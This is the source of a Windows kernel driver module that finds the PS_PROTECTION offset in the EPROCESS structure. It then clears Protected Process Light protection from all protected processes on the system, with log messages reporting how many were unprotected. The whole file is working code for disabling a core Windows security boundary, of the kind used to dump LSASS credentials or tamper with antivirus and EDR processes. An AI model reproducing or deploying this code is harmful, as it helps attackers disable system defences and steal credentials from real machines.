#include "ppl.h"
#include "Log.h"
#include "import.h"

// Exclude false positive matches in the KPROCESS/Pcb header
#ifdef _M_AMD64
#define PS_SEARCH_START				0x600
#else
#define PS_SEARCH_START				0x200
#endif

//by ZwQueryInformationProcess(ProcessProtectionInformation) get process's Protection info 
//get EPROCESS's any bytes and Protection info to match, if match for get the EPROCESS.Protection offset
NTSTATUS FindPsProtectionOffset(_Out_ PULONG PsProtectionOffset)
{
    PAGED_CODE();

    *PsProtectionOffset = 0;
    // Since the EPROCESS struct is opaque and we don't know its size, allocate for 4K possible offsets
#if NTDDI_VERSION >= NTDDI_WIN10_VB
    const PULONG CandidateOffsets = static_cast<PULONG>(ExAllocatePool2(POOL_FLAG_NON_PAGED, PAGE_SIZE * sizeof(ULONG), 'LPPK'));
#else 
    const PULONG CandidateOffsets = static_cast<PULONG>(ExAllocatePoolWithTag(NonPagedPoolNx, PAGE_SIZE * sizeof(ULONG), 'LPPK'));
#endif
    if (CandidateOffsets == nullptr) {
        return STATUS_NO_MEMORY;
    }
    RtlZeroMemory(CandidateOffsets, sizeof(ULONG) * PAGE_SIZE);

    // Query all running processes's information
    ULONG Size;
    NTSTATUS Status;
    ULONG NumProtectedProcesses = 0, BestMatchCount = 0, Offset = 0;
    PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = nullptr, Entry;
    if ((Status = ZwQuerySystemInformation(SystemProcessInformation, SystemProcessInfo, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH) {
        goto finished;
    }
#if NTDDI_VERSION >= NTDDI_WIN10_VB
    SystemProcessInfo = static_cast<PSYSTEM_PROCESS_INFORMATION>(ExAllocatePool2(POOL_FLAG_NON_PAGED, (SIZE_T)2 * Size, 'LPPK'));
#else 
    SystemProcessInfo = static_cast<PSYSTEM_PROCESS_INFORMATION>(ExAllocatePoolWithTag(NonPagedPoolNx, (SIZE_T)2 * Size, 'LPPK'));
#endif
    if (SystemProcessInfo == nullptr) {
        Status = STATUS_NO_MEMORY;
        goto finished;
    }
    Status = ZwQuerySystemInformation(SystemProcessInformation, SystemProcessInfo, 2 * Size, nullptr);
    if (!NT_SUCCESS(Status)) {
        goto finished;
    }
    // Enumerate the process list
    Entry = SystemProcessInfo;
    while (true) {
        OBJECT_ATTRIBUTES ObjectAttributes = RTL_CONSTANT_OBJECT_ATTRIBUTES(static_cast<PUNICODE_STRING>(nullptr), OBJ_KERNEL_HANDLE);
        CLIENT_ID ClientId = { Entry->UniqueProcessId, nullptr };
        HANDLE ProcessHandle;
        Status = ZwOpenProcess(&ProcessHandle, PROCESS_QUERY_LIMITED_INFORMATION, &ObjectAttributes, &ClientId);
        if (NT_SUCCESS(Status)) {
            // Query the process's protection status
            PS_PROTECTION ProtectionInfo;
            Status = ZwQueryInformationProcess(ProcessHandle, ProcessProtectionInformation, &ProtectionInfo, sizeof(ProtectionInfo), nullptr);
            // If it's protected (light or otherwise), get the EPROCESS
            if (NT_SUCCESS(Status) && ProtectionInfo.Level > 0) {
                PEPROCESS Process;
                Status = ObReferenceObjectByHandle(ProcessHandle, PROCESS_QUERY_LIMITED_INFORMATION, *PsProcessType, KernelMode, reinterpret_cast<PVOID*>(&Process), nullptr);
                if (NT_SUCCESS(Status)) {
                    // Find offsets in the EPROCESS that are a match for the PS_PROTECTION we got
                    CONST ULONG_PTR End = ALIGN_UP_BY(Process, PAGE_SIZE) - reinterpret_cast<ULONG_PTR>(Process);
                    for (ULONG_PTR i = PS_SEARCH_START; i < End; ++i) {
                        CONST PPS_PROTECTION Candidate = reinterpret_cast<PPS_PROTECTION>(reinterpret_cast<PUCHAR>(Process) + i);
                        if (Candidate->Level == ProtectionInfo.Level) {
                            CandidateOffsets[i]++;
                        }
                    }
                    NumProtectedProcesses++;
                    ObfDereferenceObject(Process);
                }
            }
            ZwClose(ProcessHandle);
        }
        if (Entry->NextEntryOffset == 0)
            break;
        Entry = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<ULONG_PTR>(Entry) +
            Entry->NextEntryOffset);
    }

    // Go over the possible offsets to find the one that is correct for all processes
    //得到最Match的偏移
    for (ULONG i = PS_SEARCH_START; i < PAGE_SIZE; ++i) {
        if (CandidateOffsets[i] > BestMatchCount) {
            if (BestMatchCount == NumProtectedProcesses) {
                Log("Found multiple offsets for PS_PROTECTION that match all processes! You should uninstall some rootkits.\n");
                Status = STATUS_NOT_FOUND;
                goto finished;
            }
            Offset = i;
            BestMatchCount = CandidateOffsets[i];
        }
    }

    if (BestMatchCount == 0 && NumProtectedProcesses > 0) {
        Log("Did not find any possible offsets for the PS_PROTECTION field.\n");
        Status = STATUS_NOT_FOUND;
        goto finished;
    }

    if (BestMatchCount != NumProtectedProcesses) {
        Log("Best found PS_PROTECTION offset match +0x%02X is only valid for %u of %u protected processes.\n",
            Offset, BestMatchCount, NumProtectedProcesses);
        Status = STATUS_NOT_FOUND;
        goto finished;
    }

    if (NumProtectedProcesses > 1) { // Require at least System + 1 PPL to give a reliable result
        Log("Found PS_PROTECTION offset +0x%02X.\n", Offset);
    }
    else {
        // This is not an error condition; it just means there are no processes to unprotect.
        // There may still be processes with signature requirements to remove. Set a non-error status to indicate this.
        Log("Did not find any non-system protected processes.\n");
        Status = STATUS_NO_MORE_ENTRIES;
        Offset = 0;
    }

    *PsProtectionOffset = Offset;
finished:
    if (SystemProcessInfo != nullptr)
        ExFreePoolWithTag(SystemProcessInfo, 'LPPK');
    ExFreePoolWithTag(CandidateOffsets, 'LPPK');
    return Status;
}

//skip Protection
NTSTATUS
UnprotectProcesses(
    _In_opt_ ULONG PsProtectionOffset,
    _In_opt_ ULONG SignatureLevelOffset,
    _In_opt_ ULONG SectionSignatureLevelOffset,
    _Out_ PULONG NumProcessesUnprotected,
    _Out_ PULONG NumSignatureRequirementsRemoved
)
{
    PAGED_CODE();
    UNREFERENCED_PARAMETER(SignatureLevelOffset);
    UNREFERENCED_PARAMETER(SectionSignatureLevelOffset);
    *NumProcessesUnprotected = 0;
    *NumSignatureRequirementsRemoved = 0;
    // Query all running processes
    NTSTATUS Status;
    ULONG Size;
    PSYSTEM_PROCESS_INFORMATION SystemProcessInfo = nullptr, Entry;
    if ((Status = ZwQuerySystemInformation(SystemProcessInformation, SystemProcessInfo, 0, &Size)) != STATUS_INFO_LENGTH_MISMATCH) {
        return Status;
    }
#if NTDDI_VERSION >= NTDDI_WIN10_VB
    SystemProcessInfo = static_cast<PSYSTEM_PROCESS_INFORMATION>(ExAllocatePool2(POOL_FLAG_NON_PAGED, (SIZE_T)2 * Size, 'LPPK'));
#else 
    SystemProcessInfo = static_cast<PSYSTEM_PROCESS_INFORMATION>(ExAllocatePoolWithTag(NonPagedPoolNx, (SIZE_T)2 * Size, 'LPPK'));
#endif
    if (SystemProcessInfo == nullptr) {
        Status = STATUS_NO_MEMORY;
        goto finished;
    }
    Status = ZwQuerySystemInformation(SystemProcessInformation, SystemProcessInfo, 2 * Size, nullptr);
    if (!NT_SUCCESS(Status))
        goto finished;

    // Enumerate the process list
    Entry = SystemProcessInfo;
    while (true) {
        PEPROCESS Process;
        Status = PsLookupProcessByProcessId(Entry->UniqueProcessId, &Process);
        if (NT_SUCCESS(Status)) {
            const ULONG Pid = HandleToULong(Entry->UniqueProcessId);
            Log("ALL PID: %u\n", Pid);
            if (PsProtectionOffset != 0) {
                const PPS_PROTECTION PsProtection = reinterpret_cast<PPS_PROTECTION>(reinterpret_cast<PUCHAR>(Process) + PsProtectionOffset);

                if (PsProtection->Level != 0 &&
                    (PsProtection->s.Type == PsProtectedTypeProtectedLight ||
                        PsProtection->s.Type == PsProtectedTypeProtected ||
                        PsProtection->s.Type == PsProtectedTypeMax))
                {
                    PsProtection->Level = 0;
                    PsProtection->s.Audit = 0;
                    PsProtection->s.Signer = (PS_PROTECTED_SIGNER)0;
                    PsProtection->s.Type = (PS_PROTECTED_TYPE)0;
                    (*NumProcessesUnprotected)++;
                    Log("Protection removed.\n\n");
                }

            }
            ObfDereferenceObject(Process);
        }

        if (Entry->NextEntryOffset == 0) {
            break;
        }
        Entry = reinterpret_cast<PSYSTEM_PROCESS_INFORMATION>(reinterpret_cast<ULONG_PTR>(Entry) + Entry->NextEntryOffset);
    }

finished:
    if (SystemProcessInfo != nullptr)
        ExFreePoolWithTag(SystemProcessInfo, 'LPPK');
    return Status;
}


//uninstall PPL protection
NTSTATUS skip_ppl_protection()
{
    OSVERSIONINFOEXW VersionInfo = { sizeof(OSVERSIONINFOEXW) };
    NTSTATUS Status = RtlGetVersion(reinterpret_cast<PRTL_OSVERSIONINFOW>(&VersionInfo));
    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    //Windows 8.1 and later are afflicted with PPL.
    if (VersionInfo.dwMajorVersion < 6 ||
        (VersionInfo.dwMajorVersion == 6 && VersionInfo.dwMinorVersion < 3))
    {
        Log("Unsupported OS version. Be glad!\n");
        return STATUS_NOT_SUPPORTED;
    }

    //Find the offset of the PS_PROTECTION field for the running kernel
    ULONG PsProtectionOffset;
    Status = FindPsProtectionOffset(&PsProtectionOffset);
    if (!NT_SUCCESS(Status) && Status != STATUS_NO_MORE_ENTRIES) {
        Log("Failed to find the PS_PROTECTION offset for Windows %u.%u.%u.\n",
            VersionInfo.dwMajorVersion, VersionInfo.dwMinorVersion, VersionInfo.dwBuildNumber);
        return Status;
    }
    //skip all process PPL protection
    ULONG NumUnprotected, NumSignatureRequirementsRemoved;
    Status = UnprotectProcesses(PsProtectionOffset,
        NULL,
        NULL,
        &NumUnprotected,
        &NumSignatureRequirementsRemoved);
    if (!NT_SUCCESS(Status)) {
        Log("UnprotectProcesses: error %08X\n", Status);
        return Status;
    }

    if (NumUnprotected > 0) {
        Log("Success.\n");
        Log("Removed PPL protection from %u processes.\n", NumUnprotected);
    }
    else {
        Log("No action was taken.\n");
    }
    return STATUS_SUCCESS;
}